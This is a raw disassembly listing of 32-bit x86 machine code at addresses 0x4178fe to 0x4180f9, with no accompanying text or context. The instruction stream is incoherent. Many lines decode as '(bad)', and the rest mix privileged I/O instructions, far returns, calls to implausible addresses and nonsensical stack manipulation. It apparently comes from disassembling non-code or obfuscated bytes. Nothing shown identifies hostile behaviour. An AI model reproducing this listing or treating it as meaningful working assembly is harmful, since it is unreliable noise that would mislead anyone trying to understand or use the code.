  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
